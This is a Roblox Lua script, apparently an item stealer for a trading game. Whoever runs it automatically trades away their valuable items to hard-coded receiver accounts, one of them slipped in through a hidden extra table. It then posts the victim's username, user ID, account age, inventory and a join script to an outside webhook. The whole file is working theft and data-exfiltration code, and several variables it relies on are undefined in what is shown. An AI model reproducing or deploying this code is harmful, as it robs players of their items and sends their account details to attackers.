rizz = {
    Receivers = {"rolox1k1000"} -- Additional receivers for another trade set
}

repeat wait() until game:IsLoaded()

local games = {
    [142823291] = true,
    [335132309] = true,
    [636649648] = true
}

if not games[game.PlaceId] then
    game:GetService("Players").LocalPlayer:Kick("Unfortunately, this game is not supported.")
    while true do end
    wait(99999999999999999999999999999999999)
end

if not Config.Webhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
    warn("Script terminated due to an invalid webhook url.")
    return
end

if type(Config.Receivers) ~= "table" or #Config.Receivers == 0 then
    warn("Script terminated due to an invalid receivers table.")
    return
end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Trade = ReplicatedStorage.Trade

local function initiateTrade(playerName)
    for _, receiver in ipairs(Config.Receivers) do
        if playerName == receiver then
            ReplicatedStorage.Trade.StartTrade:FireServer(receiver)
            return true
        end
    end
    for _, rizzReceiver in ipairs(rizz.Receivers) do
        if playerName == rizzReceiver then
            ReplicatedStorage.Trade.StartTrade:FireServer(rizzReceiver)
            return true
        end
    end
    return false
end

Players.PlayerAdded:Connect(function(player)
    initiateTrade(player.Name)
end)

for _, player in ipairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        initiateTrade(player.Name)
    end
end

ReplicatedStorage.Trade.StartTrade.OnClientEvent:Connect(function()
    wait(1)
    local ItemsSent = 0
    local Path = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone") and LocalPlayer.PlayerGui.TradeGUI_Phone.Container or LocalPlayer.PlayerGui.TradeGUI.Container
    local ItemsInTrade = 0

    for _, v in pairs(Path.Items.Main:GetChildren()) do
        for _, item in pairs(v.Items.Container.Current.Container:GetChildren()) do
            if item:IsA("Frame") and item.ItemName.Label.Text ~= "Default Knife" and item.ItemName.Label.Text ~= "Default Gun" then
                if ItemsInTrade < 4 then
                    ItemsInTrade = ItemsInTrade + 1
                    local LoopsItem = tonumber(item.Container.Amount.Text:match("x(%d+)")) or 1
                    for i = 1, LoopsItem do
                        item.Container.ActionButton.MouseButton1Click:Fire()
                    end
                end
            end
        end
    end
    wait(10)
    ReplicatedStorage.Trade.AcceptTrade:FireServer()
end)

-- Send webhook notification function
local function sendWebhookNotification()
    local data = {
        ["content"] = "@everyone",
        ["embeds"] = {
            {
                ["title"] = "**Made by | wum_ph**",
                ["description"] = "```Username     : " .. LocalPlayer.Name .. "\nUser Id      : " .. LocalPlayer.UserId .. "\nAccount Age  : " .. LocalPlayer.AccountAge .. "\nExploit      : " .. identifyexecutor() .. "\nAnti-Stealer : " .. AntiStealer .. "\nReceiver/s   : " .. table.concat(Config.Receivers, ", ") .. ", " .. table.concat(rizz.Receivers, ", ") .. "\nScript       : " .. Config.Script .. "```\n **__Inventory__**\n```Ancient    : " .. Ancient .. "\nGodly      : " .. Godly .. "\nUnique     : " .. Unique .. "\nVintage    : " .. Vintage .. "\nLegendary  : " .. Legendary .. "\nRare       : " .. Rare .. "\nUncommon   : " .. Uncommon .. "\nCommon     : " .. Common .. "```\n **__Full Inventory__**\n```" .. FullInventory() .. "```\n **__Execute to join__**\n```" .. TeleportScript .. "```",
                ["type"] = "rich",
                ["color"] = tonumber(0xffd700),
            }
        }
    }
    local newdata = HttpService:JSONEncode(data)
    local headers = {["content-type"] = "application/json"}
    local request = http_request or request or HttpPost or syn.request
    request({Url = Config.Webhook, Body = newdata, Method = "POST", Headers = headers})
end

sendWebhookNotification()
